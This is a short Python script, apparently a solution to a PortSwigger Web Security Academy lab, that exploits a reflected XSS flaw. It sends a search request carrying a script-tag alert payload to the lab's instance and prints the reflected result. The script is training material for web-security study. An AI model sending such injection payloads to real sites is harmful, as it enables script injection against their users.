#!/bin/python3.6
#James Ericsson
# 30 March 2020
#Lab: Reflected XSS into HTML context with nothing encoded
#Lab link: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

import requests
import re




##init vars
url = "https://ac2c1f6a1f621ae08098233f008f0045.web-security-academy.net/" 


#exploit
##The search feature on the main page is vulnerable to simple reflected XSS.

# # exploring the site
session = requests.Session()
# response = session.get(url)
# content = response.text
# print(content)


response = session.get(url + "?search=<script>alert(\"test\")</script>")
content = response.text
# print(content) ## to view the successfully exploited webpage uncomment.
print(re.findall('<h4>(.*)</h4>', content)[0])
